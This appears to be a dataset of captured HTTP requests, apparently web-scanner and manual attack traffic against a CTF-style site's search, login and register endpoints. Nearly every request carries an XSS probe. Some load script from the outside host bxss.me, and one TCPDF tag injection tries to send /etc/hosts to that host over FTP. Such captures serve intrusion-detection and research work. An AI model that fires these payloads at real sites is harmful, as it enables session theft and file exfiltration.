Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert%28%221%22%29%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/login HTTP/1.1
Content-Length: 506
Content-Type: multipart/form-data; boundary=-----Boundary_GYKSNITURY
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_GYKSNITURY
Content-Disposition: form-data; name=""submit""


-------Boundary_GYKSNITURY
Content-Disposition: form-data; name=""csrf_token""

Ijc4ODQwYzA0M2JiMmNiNDE0MjE1ZDY2NDk5ZGQ1MzBkNWRlZjY5ZGUi.XANTUQ.XsTuoYKPT5gIMZYtglIqLJP7AS8'""()&%<acx><ScRiPt >ChVs(9551)</ScRiPt>
-------Boundary_GYKSNITURY
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_GYKSNITURY
Content-Disposition: form-data; name=""username""

pcdtbysb
-------Boundary_GYKSNITURY--

"
"/login HTTP/1.1
Content-Length: 415
Content-Type: multipart/form-data; boundary=-----Boundary_XERRQLQFUX
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_XERRQLQFUX
Content-Disposition: form-data; name=""submit""


-------Boundary_XERRQLQFUX
Content-Disposition: form-data; name=""csrf_token""

'""()&%<acx><ScRiPt >ChVs(9006)</ScRiPt>
-------Boundary_XERRQLQFUX
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_XERRQLQFUX
Content-Disposition: form-data; name=""username""

pcdtbysb
-------Boundary_XERRQLQFUX--

"
"/login HTTP/1.1
Content-Length: 498
Content-Type: multipart/form-data; boundary=-----Boundary_YXKFPTDLNO
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_YXKFPTDLNO
Content-Disposition: form-data; name=""submit""


-------Boundary_YXKFPTDLNO
Content-Disposition: form-data; name=""csrf_token""

Ijc4ODQwYzA0M2JiMmNiNDE0MjE1ZDY2NDk5ZGQ1MzBkNWRlZjY5ZGUi.XANTUQ.XsTuoYKPT5gIMZYtglIqLJP7AS8
-------Boundary_YXKFPTDLNO
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_YXKFPTDLNO
Content-Disposition: form-data; name=""username""

'""()&%<acx><ScRiPt >ChVs(9501)</ScRiPt>
-------Boundary_YXKFPTDLNO--

"
"/login HTTP/1.1
Content-Length: 740
Content-Type: multipart/form-data; boundary=-----Boundary_MDQXRJQOMN
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_MDQXRJQOMN
Content-Disposition: form-data; name=""submit""


-------Boundary_MDQXRJQOMN
Content-Disposition: form-data; name=""csrf_token""

Ijc4ODQwYzA0M2JiMmNiNDE0MjE1ZDY2NDk5ZGQ1MzBkNWRlZjY5ZGUi.XANTUQ.XsTuoYKPT5gIMZYtglIqLJP7AS8
-------Boundary_MDQXRJQOMN
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD'>""><script src=http://bxss.me/s?u=030252&r=77-48&h=77-4fc52-1></script><tcpdf method=""addTTFFont"" params=""%5B%22%5C%2Fetc%5C%2Fhosts%22%2C%22TrueType%22%2C%22%22%2C255%2C%22ftp%3A%5C%2F%5C%2Fftpadmin%3AzaNEgbe8XcCb%40bxss.me%3A999%5C%2Fbxss,030252,77-48,77,4fc52,%22%5D""/>
-------Boundary_MDQXRJQOMN
Content-Disposition: form-data; name=""username""

mwecsqvb
-------Boundary_MDQXRJQOMN--

"
"/seArch_For_ONe_flag.php?userid=%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

"
"/seArch_For_ONe_flag.php?password=1'&userid=1<script>alert(1)</script? HTTP/1.1
User-Agent: curl/7.62.0
Accept: */*

"
"/register HTTP/1.1
Content-Length: 662
Content-Type: multipart/form-data; boundary=-----Boundary_DIHUDILJNV
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_DIHUDILJNV
Content-Disposition: form-data; name=""submit""


-------Boundary_DIHUDILJNV
Content-Disposition: form-data; name=""csrf_token""

IjE1NmIyYTk1ZGJhMzA5ZTZhYjJjODRiY2Q4M2ZjNDQzZTVkY2ZkYmUi.XANTUQ.cILVRyOeGficfWCqqtQbZL89knY
-------Boundary_DIHUDILJNV
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD</script><svg/onload='+/""/+/onmouseover=1/+(s=document.createElement(/script/.source),s.src=(/,/+/bxss.me\/s?u=030252&r=77-19&h=77-4226c-2&/).slice(2),document.documentElement.appendChild(s))//'>
-------Boundary_DIHUDILJNV
Content-Disposition: form-data; name=""username""

mqqsxkmk
-------Boundary_DIHUDILJNV--

"
"//seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1^(1=1)^1%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

"
"/login HTTP/1.1
Content-Length: 415
Content-Type: multipart/form-data; boundary=-----Boundary_QCFOPFQRAF
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_QCFOPFQRAF
Content-Disposition: form-data; name=""submit""


-------Boundary_QCFOPFQRAF
Content-Disposition: form-data; name=""csrf_token""

'""()&%<acx><ScRiPt >XxFb(9048)</ScRiPt>
-------Boundary_QCFOPFQRAF
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_QCFOPFQRAF
Content-Disposition: form-data; name=""username""

injjibao
-------Boundary_QCFOPFQRAF--

"
"/login HTTP/1.1
Content-Length: 494
Content-Type: multipart/form-data; boundary=-----Boundary_MPTMCKDBGA
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_MPTMCKDBGA
Content-Disposition: form-data; name=""submit""


-------Boundary_MPTMCKDBGA
Content-Disposition: form-data; name=""csrf_token""

IjdiYTVmODk5OGNiNzE2MTM4NjY0NGQxNDY1OTFiY2E1NDhlZWZjOTci.XANfjQ.VJmdMBbgZYHa6IWZpt1N7oq7gjc
-------Boundary_MPTMCKDBGA
Content-Disposition: form-data; name=""password""

'""()&%<acx><ScRiPt >XxFb(9758)</ScRiPt>
-------Boundary_MPTMCKDBGA
Content-Disposition: form-data; name=""username""

nqywmuyx
-------Boundary_MPTMCKDBGA--

"
"/login HTTP/1.1
Content-Length: 506
Content-Type: multipart/form-data; boundary=-----Boundary_PTUSTEMDNP
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

-------Boundary_PTUSTEMDNP
Content-Disposition: form-data; name=""submit""


-------Boundary_PTUSTEMDNP
Content-Disposition: form-data; name=""csrf_token""

IjdiYTVmODk5OGNiNzE2MTM4NjY0NGQxNDY1OTFiY2E1NDhlZWZjOTci.XANfjQ.VJmdMBbgZYHa6IWZpt1N7oq7gjc
-------Boundary_PTUSTEMDNP
Content-Disposition: form-data; name=""password""

g00dPa$$w0rD
-------Boundary_PTUSTEMDNP
Content-Disposition: form-data; name=""username""

nqywmuyx'""()&%<acx><ScRiPt >XxFb(9868)</ScRiPt>
-------Boundary_PTUSTEMDNP--

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert%28%271%27%29%3C%2Fscript%3E HTTP/1.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert(1)%3C/script%3E&password=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

"
"/seArch_For_ONe_flag.php?userid=%3Cimg+src%3D1+onerror%3Dalert%281%29+%2F%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,ar;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert(document.cookies)%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert%28%22xss%22%29%3Cscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1
Accept: text/html, application/xhtml+xml, image/jxr, */*
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0; 2345Explorer/9.5.0.17997) like Gecko
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=%22%3e%3cscript%3ealert(299792458)%3c%2fscript%3e%3c%22&password= HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert(%27cookie%27)%3C/script%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert%28%271%27%29%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

"
"/seArch_For_ONe_flag.php?userid=%3Cscript%3Ealert(666)%3C/script%3E HTTP/1.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

"
"/login/assets/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Client-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Accept-Language: en
Via: 1.1 wa.www.test.com
Origin: http://www.test.com/'>""><script src=http://bxss.me/s?u=030252&r=76-308&h=76-ac66a-1></script><tcpdf method=""addTTFFont"" params=""%5B%22%5C%2Fetc%5C%2Fhosts%22%2C%22TrueType%22%2C%22%22%2C255%2C%22ftp%3A%5C%2F%5C%2Fftpadmin%3AzaNEgbe8XcCb%40bxss.me%3A999%5C%2Fbxss,030252,76-308,76,ac66a,%22%5D""/>
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

"
"/login/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Accept: */*
Accept-Encoding: gzip,deflate
Content-Length: 157
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21

csrfmiddlewaretoken=yo81ahqRD9tO6eKobOBftzSFjzV838VPFk3sIcivI37NxHyCTV6jSnVfsdyrU7fM&password='""()%26%25<acx><ScRiPt%20>slUB(9995)</ScRiPt>&username=GRLpGpAG"
"/login/ HTTP/1.1
Content-Length: 173
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=jaDNKxkGP6lw8S4RQCUg8e5IHo4qX7FGMnBE99KUkE2qi5Llu0pBCB97VNue8FDh&password=g00dPa%24%24w0rD&username=kvincukq'""()%26%25<acx><ScRiPt%20>0M2e(9292)</ScRiPt>"
"/login/ HTTP/1.1
Content-Length: 173
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=oTGmRgNsceIHZMDiC7hUeL0Z9J41htacR6EdgSdGHMpB9ZkMgvMfI84on8uPs18N&password=g00dPa%24%24w0rD&username=kvincukq'""()%26%25<acx><ScRiPt%20>0M2e(9830)</ScRiPt>"
"/login/ HTTP/1.1
Content-Length: 177
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=FHJHreknUWg1gDj8qGhR6imWNplVTl1W8UHyQQKBpuXVqQ0C44McAFql1OLJ4TZx&password=g00dPa%2524%2524w0rD'""()%26%25<acx><ScRiPt%20>0M2e(9393)</ScRiPt>&username=kvincukq"
"/login/ HTTP/1.1
Content-Length: 157
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=oTGmRgNsceIHZMDiC7hUeL0Z9J41htacR6EdgSdGHMpB9ZkMgvMfI84on8uPs18N&password='""()%26%25<acx><ScRiPt%20>0M2e(9118)</ScRiPt>&username=kvincukq"
"/login/ HTTP/1.1
Content-Length: 351
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=FHJHreknUWg1gDj8qGhR6imWNplVTl1W8UHyQQKBpuXVqQ0C44McAFql1OLJ4TZx&password=g00dPa%2524%2524w0rD</script><svg/onload='%2b/""/%2b/onmouseover=1/%2b(s=document.createElement(/script/.source)%2cs.src=(/%2c/%2b/bxss.me%5c/s%3fu=030252%26r=76-11%26h=76-3a4ac-2%26/).slice(2)%2cdocument.documentElement.appendChild(s))//'>&username=qopfxerr"
"/login/ HTTP/1.1
Content-Length: 351
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=oTGmRgNsceIHZMDiC7hUeL0Z9J41htacR6EdgSdGHMpB9ZkMgvMfI84on8uPs18N&password=g00dPa%2524%2524w0rD</script><svg/onload='%2b/""/%2b/onmouseover=1/%2b(s=document.createElement(/script/.source)%2cs.src=(/%2c/%2b/bxss.me%5c/s%3fu=030252%26r=76-18%26h=76-3a4ac-2%26/).slice(2)%2cdocument.documentElement.appendChild(s))//'>&username=qopfxerr"
"/login/ HTTP/1.1
Content-Length: 347
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=jaDNKxkGP6lw8S4RQCUg8e5IHo4qX7FGMnBE99KUkE2qi5Llu0pBCB97VNue8FDh&password=g00dPa%24%24w0rD&username=qopfxerr</script><svg/onload='%2b/""/%2b/onmouseover=1/%2b(s=document.createElement(/script/.source)%2cs.src=(/%2c/%2b/bxss.me%5c/s%3fu=030252%26r=76-25%26h=76-3a4ac-2%26/).slice(2)%2cdocument.documentElement.appendChild(s))//'>"
"/login/ HTTP/1.1
Content-Length: 479
Content-Type: application/x-www-form-urlencoded
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

csrfmiddlewaretoken=oTGmRgNsceIHZMDiC7hUeL0Z9J41htacR6EdgSdGHMpB9ZkMgvMfI84on8uPs18N&password=g00dPa%24%24w0rD&username=qopfxerr'>""><script%20src=http://bxss.me/s%3fu=030252%26r=76-32%26h=76-3a4ac-1></script><tcpdf%20method=""addTTFFont""%20params=""%255B%2522%255C%252Fetc%255C%252Fhosts%2522%252C%2522TrueType%2522%252C%2522%2522%252C255%252C%2522ftp%253A%255C%252F%255C%252Fftpadmin%253AzaNEgbe8XcCb%2540bxss.me%253A999%255C%252Fbxss%2c030252%2c76-32%2c76%2c3a4ac%2c%2522%255D""/>"
